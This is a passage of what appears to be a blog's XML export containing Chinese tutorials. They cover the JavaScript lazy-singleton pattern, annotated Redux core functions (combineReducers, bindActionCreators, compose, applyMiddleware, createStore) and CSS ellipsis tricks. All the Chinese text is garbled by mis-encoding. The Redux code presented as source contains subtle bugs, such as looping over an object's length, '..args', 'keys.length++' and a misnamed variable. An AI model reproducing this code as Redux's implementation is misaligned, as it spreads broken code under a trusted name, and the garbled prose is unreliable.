è™½ç„¶çŽ°åœ¨è¾¾åˆ°äº†æƒ°æ€§çš„ç›®çš„ï¼Œä½†å¤±åŽ»äº†å•ä¾‹çš„æ•ˆæžœï¼Œå½“æˆ‘ä»¬ç‚¹å‡»ç™»å½•æŒ‰é’®çš„æ—¶å€™ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç™»å½•æµ®çª— div ï¼Œè™½ç„¶æˆ‘ä»¬å¯ä»¥åœ¨ç‚¹å‡»æµ®çª—ä¸Šçš„å…³é—­æ—¶æŠŠè¿™ä¸ªæµ®çª—ä»Žé¡µé¢ä¸­åˆ é™¤ï¼Œä½†è¿™æ ·é¢‘ç¹åœ°åˆ›å»ºå’Œåˆ é™¤èŠ‚ç‚¹æ˜Žæ˜¾æ˜¯ä¸åˆç†çš„ï¼Œä¹Ÿæ˜¯ä¸å¿…è¦çš„ã€‚ å¯ä»¥ç”¨ä¸€ä¸ªå˜é‡æ¥åˆ¤æ–­æ˜¯å¦å·²ç»åˆ›å»ºè¿‡ç™»å½•æµ®çª— 12345678910111213141516var createLoginLayer = (function()&#123; var div; return function()&#123; if(!div)&#123; div = document.createElement('div'); div.innerHTML = 'æˆ‘æ˜¯ç™»å½•æµ®çª—'ï¼› div.style.display = 'none'; document.body.appendChild(div); &#125; return div; &#125;&#125;)();document.getElementById('loginBtn').onClick=function()&#123; var loginLayer = createLoginLayer(); loginLayer.style.display = 'block';&#125;; é€šç”¨çš„æƒ°æ€§å•ä¾‹ä¸Šé¢è™½ç„¶å®Œæˆäº†ä¸€ä¸ªå¯ç”¨çš„æƒ°æ€§å•ä¾‹ï¼Œä½†æ˜¯å®ƒè¿˜æœ‰å¦‚ä¸‹çš„ä¸€äº›é—®é¢˜ã€‚ ä»£ç ä»ç„¶æ˜¯è¿åå•ä¸€èŒè´£åŽŸåˆ™çš„ï¼Œåˆ›å»ºå¯¹è±¡å’Œç®¡ç†å•ä¾‹çš„é€»è¾‘éƒ½æ”¾åœ¨ createLoginLayer å¯¹è±¡å†…éƒ¨ã€‚ å¦‚æžœæˆ‘ä»¬ä¸‹æ¬¡éœ€è¦åˆ›å»ºä¸€ä¸ªé¡µé¢ä¸­å”¯ä¸€çš„ iframe çš„æ—¶å€™ï¼Œæˆ–è€… script æ ‡ç­¾ï¼Œç”¨æ¥è·¨åŸŸè¯·æ±‚æ•°æ®ï¼Œå°±å¿…é¡»å¦‚æ³•ç‚®åˆ¶ï¼ŒæŠŠ createLoginLayer å‡½æ•°å‡ ä¹ŽæŠ„å¤šä¸€é 1234567891011var createIframe = (function()&#123; var iframe; return function()&#123; if(!iframe)&#123; iframe = document.createElement('iframe'); iframe.style.display = 'none'; document.body.appendChild(iframe); &#125; return iframe; &#125;&#125;)(); å¯ä»¥çœ‹å‡ºï¼Œå®žé™…ä¸Šç®¡ç†å•ä¾‹çš„é€»è¾‘å…¶å®žæ˜¯å®Œå…¨å¯ä»¥æŠ½è±¡å‡ºæ¥çš„ï¼Œè¿™ä¸ªé€»è¾‘å§‹ç»ˆæ˜¯ä¸€æ ·çš„ï¼šç”¨ä¸€ä¸ªå˜é‡æ¥æ ‡å¿—æ˜¯å¦åˆ›å»ºäº†å¯¹è±¡ï¼Œå¦‚æžœæ˜¯ï¼Œåˆ™åœ¨ä¸‹æ¬¡ç›´æŽ¥è¿”å›žè¿™ä¸ªå·²ç»åˆ›å»ºå¥½çš„å¯¹è±¡ã€‚ 1234var obj;if(!obj)&#123; obj = xxx;&#125; æˆ‘ä»¬æŠŠå¦‚ä½•ç®¡ç†å•ä¾‹çš„é€»è¾‘ä»ŽåŽŸæ¥çš„ä»£ç ä¸­æŠ½ç¦»å‡ºæ¥ï¼Œè¿™äº›é€»è¾‘è¢«å°è£…åœ¨ getSingle å‡½æ•°å†…éƒ¨ï¼Œåˆ›å»ºå¯¹è±¡çš„æ–¹æ³• fn è¢«å½“åšå‚æ•°åŠ¨æ€ä¼ å…¥ getSingle å‡½æ•°ä¸­ï¼š 123456var getSingle = function (fn) &#123; var result; return function () &#123; return result || (result = fn.apply(this, arguments)) &#125;&#125; æŽ¥ä¸‹æ¥ç”¨äºŽåˆ›å»ºç™»å½•æµ®çª—çš„æ–¹æ³•ç”¨ fn çš„å½¢å¼ä¼ å…¥åˆ°è¿™ä¸ª getSingleã€‚æˆ‘ä»¬å¯ä»¥ä¼ å…¥ä»»ä½•æˆ‘ä»¬æƒ³åˆ›å»ºçš„ä¸œè¥¿ã€‚ä¹‹åŽè®© getSingle è¿”å›žä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œå¹¶ç”¨ä¸€ä¸ªå˜é‡ result æ¥ä¿å­˜ fn çš„è®¡ç®—ç»“æžœã€‚result å˜é‡å› ä¸ºèº«åœ¨é—­åŒ…ä¸­ï¼Œå®ƒæ°¸è¿œä¸ä¼šè¢«é”€æ¯ã€‚åœ¨å°†æ¥çš„è¯·æ±‚ä¸­ï¼Œå¦‚æžœ result å·²ç»è¢«èµ‹å€¼äº†ï¼Œé‚£ä¹ˆå®ƒå°†è¿”å›žè¿™ä¸ªå€¼ã€‚ 1234567891011121314151617181920212223var createLoginLayer = function()&#123; var div = document.createElement('div'); div.innerHTML = 'æˆ‘æ˜¯ç™»å½•æµ®çª—'ï¼› div.style.display = 'none'; document.body.appendChild(div); return div;&#125;var createSingleLoginLayer = getSingle(createLoginLayer);document.getElementById('loginBtn').onClick=function()&#123; var loginLayer = createSingleLoginLayer(); loginLayer.style.display = 'block';&#125;;// ä¸‹é¢å†è¯•è¯•åˆ›å»ºå”¯ä¸€çš„ iframe ç”¨äºŽåŠ¨æ€åŠ è½½ç¬¬ä¸‰æ–¹é¡µé¢var createSingleIframe = getSingle(function()&#123; var iframe = document.createElement('iframe'); document.body.appendChild(iframe); return iframe;&#125;);document.getElementById('loginBtn').onClick=function()&#123; var loginLayer = createSingleIframe(); loginLayer.src = 'http://laibh.top';&#125;; ä¸Šé¢çš„ä¾‹å­ä¸­ï¼ŒæŠŠåˆ›å»ºå®žä¾‹å¯¹è±¡çš„èŒè´£å’Œç®¡ç†å•ä¾‹çš„èŒè´£åˆ†åˆ«æ”¾ç½®åœ¨äº†ä¸¤ä¸ªæ–¹æ³•é‡Œï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥ç‹¬ç«‹å˜åŒ–è€Œäº’ä¸å½±å“ï¼Œå½“å®ƒä»¬è¿žæŽ¥åœ¨ä¸€èµ·çš„æ—¶å€™ï¼Œå°±å®Œæˆäº†åˆ›å»ºå”¯ä¸€å®žä¾‹å¯¹è±¡çš„åŠŸèƒ½ã€‚ è¿™ç§å•ä¾‹æ¨¡å¼çš„ç”¨é€”è¿œä¸æ­¢åˆ›å»ºå¯¹è±¡ï¼Œæ¯”å¦‚æˆ‘ä»¬é€šå¸¸æ¸²æŸ“é¡µé¢ä¸­çš„ä¸€ä¸ªåˆ—è¡¨ä¹‹åŽï¼ŒæŽ¥ä¸‹æ¥è¦ç»™è¿™ä¸ªåˆ—è¡¨ç»‘å®šä¸€ä¸ª click äº‹ä»¶ï¼Œå¦‚æžœæ˜¯é€šè¿‡ ajax åŠ¨æ€å¾€åˆ—è¡¨é‡Œè¿½åŠ æ•°æ®ï¼Œåœ¨ä½¿ç”¨äº‹ä»¶ä»£ç†çš„å‰æä¸‹ï¼Œclick äº‹ä»¶å®žé™…ä¸Šåªéœ€è¦åœ¨ç¬¬ä¸€æ¬¡æ¸²æŸ“åˆ—è¡¨çš„æ—¶å€™è¢«ç»‘å®šä¸€æ¬¡ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸æƒ³åŽ»åˆ¤æ–­å½“å‰æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡æ¸²æŸ“åˆ—è¡¨ï¼Œå¦‚æžœå€ŸåŠ©JQï¼Œæˆ‘ä»¬é€šå¸¸é€‰æ‹©ç»™èŠ‚ç‚¹ç»‘å®š one äº‹ä»¶ï¼š 123456789101112var bindEvent = function () &#123; $('div').one('click', function () &#123; console.log('click'); &#125;);&#125;var render = function () &#123; console.log('å¼€å§‹æ¸²æŸ“åˆ—è¡¨'); bindEvent();&#125;render();render();render(); å¦‚æžœä½¿ç”¨ getSingle å‡½æ•°ä¹Ÿå¯ä»¥è¾¾åˆ°ä¸€æ ·çš„æ•ˆæžœï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415var bindEvent = getSingle(function()&#123; document.getElementById('div1').onclick = function()&#123; console.log('click'); &#125;; return true;&#125;);var render = function () &#123; console.log('å¼€å§‹æ¸²æŸ“åˆ—è¡¨'); bindEvent();&#125;render();render();render(); å¯ä»¥çœ‹åˆ° render å‡½æ•° å’Œ bindEvent å‡½æ•°åˆ†åˆ«éƒ½æ‰§è¡Œäº† 3 æ¬¡ï¼Œä½†æ˜¯ div å®žé™…ä¸Šåªè¢«ç»‘å®šäº†ä¸€ä¸ªäº‹ä»¶ã€‚ å°ç»“å•ä¾‹æ¨¡å¼æ˜¯ä¸€ç§ç®€å•ä½†éžå¸¸å®žç”¨çš„æ¨¡å¼ã€‚ç‰¹åˆ«æ˜¯æƒ°æ€§å•ä¾‹æŠ€æœ¯ï¼Œåœ¨åˆé€‚çš„æ—¶å€™æ‰åˆ›å»ºå¯¹è±¡ï¼Œå¹¶åªåˆ›å»ºå”¯ä¸€çš„ä¸€ä¸ªã€‚æ›´å¥‡å¦™çš„æ˜¯ï¼Œåˆ›å»ºå¯¹è±¡å’Œç®¡ç†å•ä¾‹çš„èŒè´£è¢«åˆ†å¸ƒåœ¨ä¸¤ä¸ªä¸åŒçš„æ–¹æ³•ä¸­ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•ç»„åˆèµ·æ¥æ‰å…·æœ‰å•ä¾‹æ¨¡å¼çš„å¨åŠ›ã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redux çš„å‡ ä¸ªæ ¸å¿ƒå‡½æ•°æºç ]]></title>
    <url>%2F2019-02-15-Rudex%E7%9A%84%E5%87%A0%E4%B8%AA%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%E6%BA%90%E7%A0%81.html</url>
    <content type="text"><![CDATA[æ ¹æ®è®¢é˜…å‘å¸ƒè®¾è®¡æ¨¡å¼çœ‹äº†è¦æ¨¡ä»¿çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œçœ‹ç€çœ‹ç€å‘è¶ŠæŒ–è¶Šå¤šï¼Œæ¶‰åŠåˆ°äº†redux ã€‚é¡ºä¾¿å°è¯•åƒäº†ä¸€ä¸‹ redux çš„å‡ ä¸ªæ ¸å¿ƒå‡½æ•°çš„æºç ï¼Œåˆç”Ÿæ¶©éšæœ‰å¯å‘å¹¶ä½œè®°å½•ã€‚ Redux çš„å‡ ä¸ªæ ¸å¿ƒå‡½æ•°æºç combineReducers12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061function combineReducers(reducers) &#123; const reducerKeys = Object.keys(reducers); const finalReducers = &#123;&#125;; for (let i = 0; i &lt; reducerKeys.length; i++) &#123; const key = reducerKeys[i]; if (process.env.NODE_ENV !== 'production') &#123; if (typeof reducers[key] === 'undefined') &#123; warning('No reducer provided for key' $&#123; key &#125;); &#125; &#125; if (typeof reducers[key] === 'function') &#123; finalReducers[key] = reducers[key] &#125; &#125; const finalReducerKeys = Object.keys(finalReducers); let unexpectedKeyCache; if (process.env.NODE_ENV !== 'production') &#123; unexpectedKeyCache = &#123;&#125;; &#125; let shapeAssertionError; try &#123; // åˆ¤æ–­ä¼ å…¥çš„ reducer æ ¼å¼æ˜¯å¦æ­£ç¡®ï¼Œå‡½æ•°ä½œç”¨ä¸ºä¼ å…¥çš„ type ä¸å­˜åœ¨æ—¶ï¼Œæ˜¯å¦ä¼šè¿”å›žé»˜è®¤å€¼ assertReducerShape(finalReducers) &#125; catch (e) &#123; shapeAssertionError = e; &#125; return function combination(state = &#123;&#125;, action) &#123; // å¦‚æžœå­˜åœ¨ä¸è¿”å›žé»˜è®¤å€¼çš„ reducer,æŠ›å‡ºå¼‚å¸¸ if (shapeAssertionError) &#123; throw shapeAssertionError &#125; // å‘å‡ºè­¦å‘Š ä¸å½±å“ç¨‹åºæ‰§è¡Œ if (process.env.NODE_ENV !== 'production') &#123; const warningMessage = getUnexpectedStateShapeWarningMessage(state, finalReducers, action, unexpectedKeyCache); if (warningMessage) &#123; warning(warningMessage) &#125; &#125; // è®°å½•æ˜¯å¦å‘ç”Ÿäº†å˜åŒ–ï¼Œé‡ç‚¹ let hasChanged = false; // è¦è¿”å›žçš„ä¸‹ä¸€ä¸ªçŠ¶æ€ const nextState = &#123;&#125;; for (let i = 0; i &lt; finalReducers.length; i++) &#123; const key = finalReducerKeys[i]; const reducer = finalReducers[key]; // ä½¿ç”¨è¯¥å‡½æ•°çš„è¦æ±‚ï¼Œæ¯ä¸ª reducer çš„ key å€¼è¦å’Œå½“å‰æ“ä½œçš„ state çš„å‚æ•°åŒåï¼Œæ¯”å¦‚ä¼ å…¥çš„ card:cardReducer,é‚£ä¹ˆ state æ“ä½œçš„å‚æ•°å°±å¿…é¡»æ˜¯ state.card const previousStateForKey = state[key]; const nextStateForKey = reducer(previousStateForKey, action); if (typeof nextStateForKey === 'undefined') &#123; const errorMessage = getUndefinedStateErrorMessage(key, action); throw new Error(errorMessage); &#125; // æ‰§è¡Œäº† reducer ä¹‹åŽçš„ç»“æžœ nextState[key] = nextStateForKey; // æ¯æ¬¡æ‰§è¡Œä¹‹åŽçš„ç»“æžœï¼Œå†ç»¼åˆä¸Šä¸€æ¬¡å¾—åˆ°çš„ hasChanged,å¾—åˆ°æœ€ç»ˆçš„ state æ˜¯å¦å‘ç”Ÿäº†å˜åŒ– hasChanged = hasChanged || nextStateForKey !== previousStateForKey; &#125; // å¦‚æžœå‘ç”Ÿäº†å˜åŒ–ï¼Œå°±è¦è¿”å›žæ–°çš„ state -&gt; nextState return hasChanged ? nextState : state; &#125;&#125; bindActionCreators12345678910111213141516171819202122232425function bindActionCreator(actionCreator, dispatch) &#123; return (...args) =&gt; dispatch(actionCreator(..args));&#125;function bindActionCreators(actionCreators, dispatch) &#123; // å¯ä»¥åªä¼ å…¥ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå®ƒä¼šç»™è¿™ä¸ªå‡½æ•°çš„è¿”å›žç»“æžœæ·»åŠ  dispatch å¤„ç† if (typeof actionCreators === 'function') &#123; return bindActionCreator(actionCreators, dispatch); &#125; if (typeof actionCreators !== 'object' || actionCreators === null) &#123; throw new Error( `bindActionCreators expected an object or a function,instead received $&#123;actionCreators === null ? 'null' : typeof actionCreators&#125;` + `Did you write 'import ActionCreators from' instead of 'immport * as ActionCreators from'?`); &#125; const keys = Object.keys(actionCreators); const boundActionCreators = &#123;&#125;; for (let i = 0; i &lt; keys.length++; i++) &#123; const key = keys[i]; const actionCreator = actionCreator[key]; if (typeof actionCreator === 'function') &#123; boundActionCreators[key] = bindActionCreator(actionCreator, dispatch); &#125; &#125; // ä¸ºå…¶æ·»åŠ  dispatch å¹¶è¿”å›ž return boundActionCreators;&#125; compose123456789function compose(...funcs) &#123; if (funcs.length === 0) &#123; return arg =&gt; arg &#125; if (funcs.length === 1) &#123; return funcs[0]; &#125; return funcs.reduce((a, b) =&gt; (...args) =&gt; a(b(...args)));&#125; applyMiddleware12345678910111213141516171819function applyMiddleware(...middlewares) &#123; return (createStore) =&gt; (reducer, preloadedState, enhancer) =&gt; &#123; const store = createStore(reducer, preloadedState, enhancer); let dispatch = store.dispatch; // å®šä¹‰ä¸€ä¸ªå­˜å‚¨ä¸­é—´ä»¶å‡½æ•°çš„åˆ—è¡¨ let chain = []; const middlewareAPI = &#123; getState: store.getState, dispatch: (action) =&gt; dispatch(action) &#125; // è¿™é‡Œçœ‹å‡º middleware éœ€è¦ç¬¦åˆä¸€ä¸ªè§„åˆ™ï¼ŒæŽ¥å— getState() å’Œ dispatch ä½œä¸ºå‚æ•° chain = middlewares.map(middleware =&gt; middleware(middlewareAPI)) dispatch = compose(...chain)(store.dispatch); return &#123; ...store, // åŽŸæ¥çš„ store ç»“æž„ dispatch // å¢žå¼ºè¿‡çš„ &#125; &#125;&#125; createStore(é‡ç‚¹)å›¾è§£ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100function createStore(reducer, preloadedState, enhancer) &#123; // è¿™é‡Œæ“ä½œè¡¨æ˜Žï¼Œå¯ä»¥ä¸ä¼ ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¸ä¼ é»˜è®¤ä¸º undefined if (typeof preloadedState === 'function' &amp;&amp; typeof enhancer === 'undefined') &#123; enhancer = preloadedState; preloadedState = undefined; &#125; if (typeof enhancer !== 'undefined') &#123; // enhancer å¿…é¡»æ˜¯ä¸€ä¸ªå‡½æ•° if (typeof enhancer !== 'function') &#123; throw new Error('Expected the enhancer to be a function'); &#125; // å¦‚æžœä¼ é€’ enhancer,åˆ™æŠŠ createStore ä½œä¸ºå‚æ•°ä¼ é€’è¿›åŽ»ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ç©¿ä¹Ÿå¯ä»¥ï¼Œapplymiddleware ä¸­ä¼šå°† createStore æ‰§è¡Œå¹¶è¿”å›ž return enhancer(createStore)(reducer, preloadedState); &#125; if (typeof reducer !== 'function') &#123; throw new Error('Expected the reducer to be a function'); &#125; let currentReducer = reducer; // å½“å‰çš„state let currentState = preloadedState; // å½“å‰çš„listeners let currentListeners = []; let nextListeners = currentListeners; // æ˜¯å¦åœ¨åˆ†å‘ let isDispatching = false; function ensureCanMutateNextListeners() &#123; if (nextListeners === currentListeners) &#123; nextListeners = currentListeners.slice(); // æµ…æ‹·è´ &#125; &#125; function getState() &#123; return currentState; &#125; function subscribe(listener) &#123; if (typeof listener !== 'function') &#123; throw new Error('Expected listener to be a function'); &#125; let isSubscribed = true; ensureCanMutateNextListeners() nextListeners.push(listener); return function unsubscribe() &#123; if (!isSubscribed) &#123; return &#125; isSubscribed = false; ensureCanMutateNextListeners(); const index = nextListeners.indexOf(listener); nextListeners.splice(index, 1); &#125; &#125; function dispatch(action) &#123; // action å¿…é¡»æ˜¯ä¸€ä¸ªå¯¹è±¡&#123;type:'xxx'&#125; if (!isPlainObject(action)) &#123; throw new Error('Actions must be plain object,Use custom middleware for async actions'); &#125; // å¯¹è±¡å¿…é¡»æœ‰ type å±žæ€§ï¼ˆå”¯ä¸€ç¡®å®šä¸€ä¸ª actionï¼Œä¸èƒ½é‡å¤ï¼‰ if (typeof action.type === 'undefined') &#123; throw new Error('Actions may not have an undefined "type" property.Have you misspelled a constant'); &#125; // ä¸èƒ½åŒæ—¶æ‰§è¡Œä¸¤ä¸ª dispatch if (isDispatching) &#123; throw new Error('Reducers may not dispatch actions'); &#125; try &#123; isDispatching = true //ä¸è®ºç¬¬ä¸€æ¬¡ä¼ å…¥currentStateæ˜¯å¦æœ‰å€¼ï¼Œéƒ½ä¼šæ ¹æ®ç¬¬ä¸€æ¬¡çš„reducerè¿”å›žé»˜è®¤å€¼ //æ¯”å¦‚é¦–æ¬¡æ‰§è¡ŒcreateStoreå°±ä¼šä¼ å…¥ä¸€ä¸ªå‡ ä¹Žä¸ä¼šå­˜åœ¨äºŽreducerçš„caseä¸­çš„ç±»åž‹ï¼Œè¿™æ ·å°±å¯ä»¥è¿”å›žç¬¬ä¸€æ¬¡ä¼ å…¥reducerçš„é»˜è®¤å€¼äº†ã€‚ currentState = currentReducer(currentState, action) &#125; finally &#123; //æ”¾å¼€dispatchå…¥å£ isDispatching = false &#125; const listeners = currentListeners = nextListeners; for (let i = 0; i &lt; listeners.length; i++) &#123; const listener = listeners[i]; listener(); &#125; return action; &#125; function replaceReducer(nextReducer) &#123; if (typeof nextReducer !== 'function') &#123; throw new Error('Expected the nextReducer to be a function'); &#125; currentReducer = nextReducer; dispatch(&#123; type: ActionTypes.INIT &#125;); &#125; // ä¸€ä¸ªæ­£è§„çš„ reducer éƒ½ä¼šè¿”å›žä¸€ä¸ªé»˜è®¤å€¼ï¼Œæ‰§è¡Œè¿™ä¸€æ­¥ æ˜¯ä¸ºäº†è¿”å›ž reducer çš„é»˜è®¤å€¼ dispatch(&#123; type: ActionTypes.INIT &#125;); return &#123; dispatch, subscribe, getState, replaceReducer &#125;&#125;]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>redux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS ä¸­çœç•¥å·çš„å‡ ç§å†™æ³•]]></title>
    <url>%2F2019-02-12-CSS%20%E4%B8%AD%E7%9C%81%E7%95%A5%E5%8F%B7%E7%9A%84%E5%87%A0%E7%A7%8D%E5%86%99%E6%B3%95.html</url>
    <content type="text"><![CDATA[CSS ä¸­çœç•¥å·çš„å‡ ç§å†™æ³•123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;çœç•¥å·çš„å››ç§å†™æ³•&lt;/title&gt; &lt;style&gt; p&#123; width: 80%; margin:auto; &#125; .prg&#123; height: 20px; line-height: 20px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; &#125; /* white-space è®¾ç½®å¦‚ä½•å¤„ç†å…ƒç´ å†…çš„ç©ºç™½ã€‚ è¿™ä¸ªå±žæ€§å£°æ˜Žå»ºç«‹å¸ƒå±€è¿‡ç¨‹ä¸­å¦‚ä½•å¤„ç†å…ƒç´ ä¸­çš„ç©ºç™½ç¬¦ï¼Œé»˜è®¤å€¼ä¸º normal normal é»˜è®¤ï¼Œç©ºç™½ä¼šè¢«æµè§ˆå™¨å¿½ç•¥ pre ç©ºç™½ä¼šè¢«æµè§ˆå™¨ä¿ç•™ï¼Œå…¶è¡Œä¸ºæ–¹å¼ç±»ä¼¼ HTML ä¸­çš„ &lt;pre&gt; æ ‡ç­¾ nowrap æ–‡æœ¬ä¸ä¼šæ¢è¡Œï¼Œæ–‡æœ¬ä¼šåœ¨åŒä¸€è¡Œä¸Šç»§ç»­ï¼ŒçŸ¥é“é‡åˆ° &lt;br&gt; æ ‡ç­¾ä¸ºæ­¢ pre-wrap ä¿ç•™ç©ºç™½ç¬¦åºåˆ—ï¼Œä½†æ˜¯æ­£å¸¸åœ°è¿›è¡Œæ¢è¡Œ pre-line åˆå¹¶ç©ºç™½ç¬¦åºåˆ—ï¼Œä½†æ˜¯ä¿ç•™æ¢è¡Œç¬¦ inherit è§„å®šåº”è¯¥ä»Žçˆ¶å…ƒç´ ç»§æ‰¿ white-space å±žæ€§çš„å€¼ text-overflow è§„å®šå½“æ–‡æœ¬æº¢å‡ºåŒ…å«å…ƒç´ æ—¶å‘ç”Ÿçš„äº‹æƒ… é»˜è®¤å€¼ä¸º clip clip ä¿®å‰ªæ–‡æœ¬ elipsis æ˜¾ç¤ºçœç•¥ç¬¦å·æ¥ä»£è¡¨è¢«ä¿®å‰ªçš„æ–‡æœ¬ string ä½¿ç”¨ç»™å®šçš„å­—ç¬¦ä¸²æ¥ä»£è¡¨è¢«ä¿®å‰ªçš„æ–‡æœ¬ */ .prg1&#123; position: relative; overflow: hidden; text-overflow: ellipsis; height: 60px; line-height: 20px; &#125; .prg1::after&#123; content: '...'; padding-left: 3px; position: absolute; top: 20px; left: 0; display: block; height: 20px; width: 20px; background: #fff; &#125; .prg2&#123; display: -webkit-box; -webkit-box-orient:vertical; overflow: hidden; text-overflow: ellipsis; -webkit-line-clamp:1; &#125; /* -webkit-line-clamp æ˜¯ä¸€ä¸ªä¸è§„èŒƒçš„å±žæ€§ï¼Œè¿˜æ²¡æœ‰å‡ºçŽ°åœ¨ CSS è§„èŒƒè‰æ¡ˆä¸­ é™åˆ¶ä¸€ä¸ªå—å…ƒç´ æ˜¾ç¤ºçš„æ–‡æœ¬è¡Œæ•°ï¼Œä¸ºäº†å®žçŽ°è¯¥æ•ˆæžœï¼Œå®ƒéœ€è¦ç»„åˆå…¶ä»–å¤–æ¥çš„Webkitå±žæ€§ï¼Œ å¸¸è§çš„å±žæ€§ï¼šdisplay:-webkit-box; å¿…é¡»ç»“åˆçš„å±žæ€§ï¼Œå°†å¯¹è±¡ä½œä¸ºå¼¹æ€§ä¼¸ç¼©ç›’å­æ¨¡åž‹æ˜¾ç¤º -webkit-box-orient å¿…é¡»ç»“åˆçš„å±žæ€§ï¼Œè®¾ç½®æˆ–æ£€ç´¢ä¼¸ç¼©ç›’å¯¹è±¡çš„å­å…ƒç´ çš„æŽ’åˆ—æ–¹å¼ text-overflow å¯ä»¥ç”¨æ¥å¤šè¡Œæ–‡æœ¬çš„æƒ…å†µä¸‹ï¼Œç”¨çœç•¥å·... éšè—è¶…å‡ºèŒƒå›´çš„æ–‡æœ¬ã€‚ */ &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;å•è¡Œçœç•¥...&lt;/h3&gt; &lt;p class="prg"&gt;å‰ç«¯æŠ€æœ¯ä¸€èˆ¬åˆ†ä¸ºå‰ç«¯è®¾è®¡å’Œå‰ç«¯å¼€å‘ï¼Œå‰ç«¯è®¾è®¡ä¸€èˆ¬å¯ä»¥ç†è§£ä¸ºç½‘ç«™çš„è§†è§‰è®¾è®¡ï¼Œå‰ç«¯å¼€å‘åˆ™æ˜¯ç½‘ç«™çš„å‰å°ä»£ç å®žçŽ°ï¼ŒåŒ…æ‹¬åŸºæœ¬çš„HTMLå’ŒCSSä»¥åŠJavaScript/ajaxï¼ŒçŽ°åœ¨æœ€æ–°çš„é«˜çº§ç‰ˆæœ¬HTML5ã€CSS3ï¼Œä»¥åŠSVGç­‰ã€‚&lt;/p&gt; &lt;h3&gt;å¤šè¡Œçœç•¥...&lt;/h3&gt; &lt;p class="prg1"&gt;å‰ç«¯æŠ€æœ¯ä¸€èˆ¬åˆ†ä¸ºå‰ç«¯è®¾è®¡å’Œå‰ç«¯å¼€å‘ï¼Œå‰ç«¯è®¾è®¡ä¸€èˆ¬å¯ä»¥ç†è§£ä¸ºç½‘ç«™çš„è§†è§‰è®¾è®¡ï¼Œå‰ç«¯å¼€å‘åˆ™æ˜¯ç½‘ç«™çš„å‰å°ä»£ç å®žçŽ°ï¼ŒåŒ…æ‹¬åŸºæœ¬çš„HTMLå’ŒCSSä»¥åŠJavaScript/ajaxï¼ŒçŽ°åœ¨æœ€æ–°çš„é«˜çº§ç‰ˆæœ¬HTML5ã€CSS3ï¼Œä»¥åŠSVGç­‰ã€‚&lt;/p&gt; &lt;h3&gt;å¤šè¡Œçœç•¥...&lt;/h3&gt; &lt;p class="prg2"&gt;å‰ç«¯æŠ€æœ¯ä¸€èˆ¬åˆ†ä¸ºå‰ç«¯è®¾è®¡å’Œå‰ç«¯å¼€å‘ï¼Œå‰ç«¯è®¾è®¡ä¸€èˆ¬å¯ä»¥ç†è§£ä¸ºç½‘ç«™çš„è§†è§‰è®¾è®¡ï¼Œå‰ç«¯å¼€å‘åˆ™æ˜¯ç½‘ç«™çš„å‰å°ä»£ç å®žçŽ°ï¼ŒåŒ…æ‹¬åŸºæœ¬çš„HTMLå’ŒCSSä»¥åŠJavaScript/ajaxï¼ŒçŽ°åœ¨æœ€æ–°çš„é«˜çº§ç‰ˆæœ¬HTML5ã€CSS3ï¼Œä»¥åŠSVGç­‰ã€‚&lt;/p&gt; &lt;h3&gt;å¤šè¡Œçœç•¥...&lt;/h3&gt; &lt;p class="prg3"&gt;å‰ç«¯æŠ€æœ¯ä¸€èˆ¬åˆ†ä¸ºå‰ç«¯è®¾è®¡å’Œå‰ç«¯å¼€å‘ï¼Œå‰ç«¯è®¾è®¡ä¸€èˆ¬å¯ä»¥ç†è§£ä¸ºç½‘ç«™çš„è§†è§‰è®¾è®¡ï¼Œå‰ç«¯å¼€å‘åˆ™æ˜¯ç½‘ç«™çš„å‰å°ä»£ç å®žçŽ°ï¼ŒåŒ…æ‹¬åŸºæœ¬çš„HTMLå’ŒCSSä»¥åŠJavaScript/ajaxï¼ŒçŽ°åœ¨æœ€æ–°çš„é«˜çº§ç‰ˆæœ¬HTML5ã€CSS3ï¼Œä»¥åŠSVGç­‰ã€‚&lt;/p&gt;&lt;/body&gt;&lt;script&gt; (function (w) &#123; const shortLine = function (pragrafsClass, number) &#123; const prgs = document.getElementsByClassName(pragrafsClass); for (let i = 0; i &lt; prgs.length; i++) &#123; let contents = prgs[i].textContent; if (contents.length &gt;= number) &#123; let strs = contents.slice(0, number) prgs[i].textContent = strs + "..." &#125; &#125; &#125; w.shortLine = shortLine &#125;)(window) window.shortLine('prg3',18) &lt;/script&gt; &lt;/html&gt;]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”å‘å¸ƒ-è®¢é˜…æ¨¡å¼]]></title>
    <url>%2F2019-01-29-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E5%8F%91%E5%B8%83-%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F.html</url>
